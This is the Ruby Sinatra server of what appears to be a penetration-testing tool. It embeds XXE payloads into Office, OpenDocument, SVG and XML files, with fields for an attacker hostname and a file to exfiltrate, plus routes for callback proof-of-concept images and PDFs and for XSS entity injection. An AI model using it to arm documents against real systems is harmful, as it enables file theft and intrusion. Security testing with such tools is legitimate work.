# encoding: ASCII-8BIT
require 'rubygems'
require 'sinatra'
require 'haml'
require 'json'
require 'fileutils'
require 'optparse'
require 'json'
require './lib/util'
require 'sequel'
require 'yaml'

if not File.file?('./db/master.db')
    puts "|+| Database does not exist, initializing a blank one."
    out_file = File.new("./db/master.db", "w")
    out_file.puts("")
    out_file.close
		DB = Sequel.sqlite("#{Dir.pwd}/db/master.db")

		DB.create_table :oxfiles do
			primary_key :id
			String :filename
			String :location
			String :desc
			String :type
			DateTime :created_at
			DateTime :updated_at
		end

end
require './lib/model'

# TODO apply to all xml in docx
# TODO explain each menu item in help
# TODO soft link content types

set :public_folder, File.dirname(__FILE__) + '/public'
set :protocols, ["http","https","ftp","jar","file","netdoc","mailto","gopher","none"]
set :types, ["docx","pptx","xlsx","svg","odt","xml","odg","odp","ods"]
set :poc_types, ["pdf","jpg","gif"]

# Keep the payloads organized
def read_payloads()
	data = YAML.load_file('payloads.yaml')

	payloads = {}
	data.each do |entry|
		name = entry['name']
		long = entry['long']
		payload = entry['payload']
		description = entry['description']
		payloads[name] = [payload, description]
	end
	return payloads
end

def oxml_file_defaults()
	d = {}
	d["docx"] = ["samples/sample.docx", "word/document.xml"]
	d["xlsx"] = ["samples/sample.xlsx", "xl/workbook.xml"]
	d["pptx"] = ["samples/sample.pptx", "ppt/presentation.xml"]
	d["odt"] =  ["samples/sample.odt", "content.xml"]
	d["odg"] =  ["samples/sample.odg", "content.xml"]
	d["odp"] =  ["samples/sample.odp", "content.xml"]
	d["ods"] =  ["samples/sample.ods", "content.xml"]

	return d
end

set :payloads, read_payloads

get '/' do
	redirect to("/build")
end

get '/build' do
	@types = settings.types
	@payloads = settings.payloads
	@protos = settings.protocols
  slim :build
end

post '/build' do
	oxmls = oxml_file_defaults()
	pl = read_payloads()

	if params["proto"] == "none"
		ip = params["hostname"]
	else
		# TODO is this correct for all protocols?
		ip = params["proto"]+"://"+params["hostname"]
	end

	if params[:file] != nil
		# TODO support svg
		# TODO support xml
		input_file = params[:file][:tempfile].read
		nname = "temp_#{Time.now.to_i}_"
		ext = params[:file][:filename].split('.').last
		rand_file = "./output/#{nname}_z.#{ext}"
		File.open(rand_file, 'wb') {|f| f.write(input_file) }
		file_exploit = rand_file
	end

	if oxmls.include?(params["file_type"])
		xml_file = params["xml_file"].size > 0 ? params["xml_file"] : oxmls[params["file_type"]][1]
		file_exploit = oxmls[params["file_type"]][0]
		fn = insert_payload_docx(file_exploit,xml_file,pl[params["payload"]][0],ip,params["exfil_file"])
	elsif params["file_type"] == "svg"
		fn = insert_payload_svg("./samples/sample.svg",pl[params["payload"]][0],ip,params["exfil_file"])
	elsif params["file_type"] == "xml"
		fn = insert_payload_xml("./samples/sample.xml",pl[params["payload"]][0],ip,params["exfil_file"])
	end

	# write entry to database
  x = Oxfile.new
  x.filename = fn.split('/').last
  x.location = fn
  x.desc = clean_html(params["desc"])
  x.type = params["file_type"]
  p x
  x.save

	send_file(fn, :filename => "#{fn.split('/').last}")
end

get '/replace' do
	@types = settings.types
	@payloads = settings.payloads
	@protos = settings.protocols
  slim :replace
end

post '/replace' do
	if params[:file] == nil
		return "Error no file included"
	end

	pl = read_payloads()

	if params["proto"] == "none"
		ip = params["hostname"]
	else
		# TODO is this correct for all protocols
		ip = params["proto"]+"://"+params["hostname"]
	end

	input_file = params[:file][:tempfile].read
	nname = "temp_#{Time.now.to_i}_"
	ext = params[:file][:filename].split('.').last
	rand_file = "./output/#{nname}_z.#{ext}"
	File.open(rand_file, 'wb') {|f| f.write(input_file) }

	# TODO logic check if svg or xml
	# TODO modify uri

	fn = string_replace(pl[params["payload"]][0],rand_file,ip,params["exfil_file"])

	if fn == "|-|"
		"|-| Could not find § in document, please verify."
	else
		# create a new Oxfile instance with attributes set
		file = Oxfile.new(
			:filename => fn.split('/').last,
			:location => fn,
			:desc => clean_html(params["desc"]),
			:type => fn.split('.').last
		)

		# save the instance to the database
		file.save

		send_file(fn, :filename => "#{fn.split('/').last}")
	end
end

get '/xss' do
  slim :xss
end

post '/xss' do
	if params[:file] == nil
		return "Error no file included"
	end

	input_file = params[:file][:tempfile].read
	nname = "temp_#{Time.now.to_i}_"
	ext = params[:file][:filename].split('.').last
	rand_file = "./output/#{nname}_z.#{ext}"
	File.open(rand_file, 'wb') {|f| f.write(input_file) }

	# TODO add an option to add an xss wherever
  # TODO logic check if svg or xml
	# TODO modify uri
	# TODO add a supported types box
	# TODO add a non-entity replacement option

	xss = "<!DOCTYPE root [<!ENTITY xxe \"#{params[:xss]}\">]>"
	xss = "<!DOCTYPE root [<!ENTITY xxe \"<![CDATA[#{params[:xss]}]>\">]>" if params[:cdata]

	fn = string_replace(xss,rand_file,"","")
	if fn == "|-|"
    error =	"|-| Could not find § in document, please verify."
    puts error
    slim :error
	else
		# write entry to database
		file = Oxfile.new
		file.filename = fn.split('/').last
		file.location = fn
		file.desc = clean_html(params["desc"])
		file.type = fn.split('.').last
		file.save

		send_file(fn, :filename => "#{fn.split('/').last}")
	end
end

get '/poc' do
	@types = settings.poc_types
	@protos = settings.protocols

  slim :poc
end

post '/poc' do
	if params["proto"] == "none"
		ip = params["hostname"]
	else
		# TODO is this correct for all protocols?
		ip = params["proto"]+"://"+params["hostname"]
	end

	if params["file_type"] == "pdf"
		fn = pdf_poc(ip)
	elsif params["file_type"] == "gif"
		fn = gif_poc(ip)
	elsif params["file_type"] == "jpg"
		fn = jpg_poc(ip)
	end

	# write entry to database
	file = Oxfile.new
	file.filename = fn.split('/').last
	file.location = fn
	file.desc = clean_html(params["desc"])
	file.type = params["file_type"]
	file.save

	send_file fn, :type => params["file_type"], :filename => "#{fn.split('/').last}"
end

get '/list' do
	@files = Oxfile.all
  p @files

  slim :list
end

get '/download' do
	# check if params is set
	file = Oxfile.first(:id => params["id"])

	send_file file.location, :filename => file.filename
end

get '/display' do
  slim :display
end

post '/display_file' do
	if params[:file] == nil
		return "Error no file included"
	end

	input_file = params[:file][:tempfile].read
	nname = "temp_#{Time.now.to_i}_"
	ext = params[:file][:filename].split('.').last
	rand_file = "./output/#{nname}_z.#{ext}"
	File.open(rand_file, 'wb') {|f| f.write(input_file) }

	@files = display_file(rand_file)
  slim :display_file
end

get '/view_file' do
	if params[:id] == nil
		return "Error no file included"
	end

	file = Oxfile.first(:id => params["id"])
	rand_file = file.location

	@files = display_file(rand_file)
  slim :display_file
end

get '/delete' do
	file = Oxfile.first(:id => params["id"])
	if file == nil
		redirect '/list'
	end
	file.destroy if file
	File.delete(file.location) if file.location
	redirect '/list'
end

get '/help' do
	@payloads = read_payloads()
  slim :help
end

get '/overwrite' do
  slim :overwrite
end

post '/overwrite' do
	if params[:file] == nil
		return "Error, no file included"
	end
	if params[:xml_file] == nil
		return "Error, no xml_file specified"
	end

	input_file = params[:file][:tempfile].read
	nname = "temp_#{Time.now.to_i}_"
	ext = params[:file][:filename].split('.').last
	rand_file = "./output/#{nname}_z.#{ext}"
	File.open(rand_file, 'wb') {|f| f.write(input_file) }

	if params[:replace_file] != nil
		contents = params[:replace_file][:tempfile].read
	else
		contents = params[:xml_content]
	end
	p contents
	fn = insert_payload_docx_(rand_file,params["xml_file"],contents,'','',true)

	# write entry to database
	file = Oxfile.new
	file.filename = fn.split('/').last
	file.location = fn
	file.desc = clean_html(params["desc"])
	file.type = fn.split('.').last
	file.save

	send_file(fn, :filename => "#{fn.split('/').last}")
end
